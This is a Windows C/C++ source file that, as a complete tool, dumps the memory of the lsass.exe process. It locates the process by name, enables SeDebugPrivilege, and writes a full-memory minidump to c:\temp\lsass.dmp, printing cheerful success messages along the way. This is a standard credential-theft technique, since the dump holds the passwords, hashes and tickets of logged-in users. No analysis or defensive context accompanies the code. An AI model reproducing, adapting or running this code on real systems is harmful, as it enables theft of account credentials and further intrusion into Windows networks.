#define UNICODE
#define _UNICODE
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <string>
#pragma comment (lib, "dbghelp.lib")

// Convert narrow string to wide string
std::wstring ConvertNarrowToWide(const char* narrowStr) {
    int wideStrLength = MultiByteToWideChar(CP_ACP, 0, narrowStr, -1, nullptr, 0);
    std::wstring wideStr(wideStrLength, 0);
    MultiByteToWideChar(CP_ACP, 0, narrowStr, -1, &wideStr[0], wideStrLength);
    return wideStr;
}

int findMyProc(const char* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // Convert procname to a wide string
    std::wstring wideProcName = ConvertNarrowToWide(procname);

    // Snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // Initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // Retrieve information about the processes
    while (hResult) {
        // Compare wide strings
        if (wcscmp(wideProcName.c_str(), pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // Close the handle
    CloseHandle(hSnapshot);
    return pid;
}

// Set privilege
BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL res = TRUE;

    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
    printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
    return res;
}

// Minidump lsass.exe
BOOL createMiniDump() {
    bool dumped = FALSE;
    int pid = findMyProc("lsass.exe");
    HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
    HANDLE out = CreateFile(TEXT("c:\\temp\\lsass.dmp"), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ph && out != INVALID_HANDLE_VALUE) {
        dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
        printf(dumped ? "successfully dumped to lsass.dmp :)\n" : "failed to dump :(\n");
    }
    return dumped;
}

int main(int argc, char* argv[]) {
    if (!setPrivilege(SE_DEBUG_NAME)) return -1;
    if (!createMiniDump()) return -1;
    return 0;
}
